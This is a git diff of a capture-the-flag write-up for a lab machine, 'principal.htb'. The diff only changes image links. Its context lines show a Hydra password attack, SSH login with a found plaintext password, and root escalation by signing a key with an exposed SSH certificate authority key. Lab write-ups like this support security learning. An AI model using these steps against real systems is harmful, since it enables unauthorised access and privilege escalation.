@@ -126,7 +126,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ### Port 8080
-![[Pasted image 20260612084853.png]]
+![Pasted image 20260612084853](../Attachments/Pasted%20image%2020260612084853.png)
 
 - Checking view source the main app being loaded is via `/static/js/app.js`
 - Here we can see under Token management that the token is saved as `auth_token`. 
@@ -158,10 +158,10 @@ sessionStorage.setItem('auth_token', 'eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6IC
 ```
 
 - ON a refresh we can access the dahboard:
-![[Pasted image 20260612104506.png]]
+![Pasted image 20260612104506](../Attachments/Pasted%20image%2020260612104506.png)
 
 - Under settings i see a key : `D3pl0y_$$H_Now42!`
-![[Pasted image 20260612104733.png]]
+![Pasted image 20260612104733](../Attachments/Pasted%20image%2020260612104733.png)
 - I also see a list of users:
 ```
 admin
@@ -189,17 +189,17 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-12 10:50:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-12 10:50:36
 ```
-![[Pasted image 20260612105249.png]]
+![Pasted image 20260612105249](../Attachments/Pasted%20image%2020260612105249.png)
 
 - I ssh into target:
 ```
 ssh dvc-deploy@principal.htb
 > D3pl0y_$$H_Now42!
 ```
-![[Pasted image 20260612105439.png]]
+![Pasted image 20260612105439](../Attachments/Pasted%20image%2020260612105439.png)
 
 - I grab user flag:
-![[Pasted image 20260612105456.png]]
+![Pasted image 20260612105456](../Attachments/Pasted%20image%2020260612105456.png)
 
 - CHecking id we see it is part of deployers group:
 ```
@@ -263,7 +263,7 @@ avZUzxb6uPQ2VQ/XgBtIB3Ik+PysDfJFKYkiJ934bG2MD78qDGFWIpFqhjlQK+6K8kXNfW
 3m+NdOR8xTkAAAAQcHJpbmNpcGFsLXNzaC1jYQECAw==
 ```
 
-![[Pasted image 20260612110422.png]]
+![Pasted image 20260612110422](../Attachments/Pasted%20image%2020260612110422.png)
 
 - Reading the README.txt:
 ```
@@ -294,7 +294,7 @@ ssh-keygen -s /opt/principal/ssh/ca -I "deploy" -n root -V +1h /tmp/mykey.pub
 ssh -i /tmp/mykey -o CertificateFile=/tmp/mykey-cert.pub root@localhost
 ```
 
-![[Pasted image 20260612111012.png]]
+![Pasted image 20260612111012](../Attachments/Pasted%20image%2020260612111012.png)
 
 - I grab the root flag:
-![[Pasted image 20260612111039.png]]
+![Pasted image 20260612111039](../Attachments/Pasted%20image%2020260612111039.png)
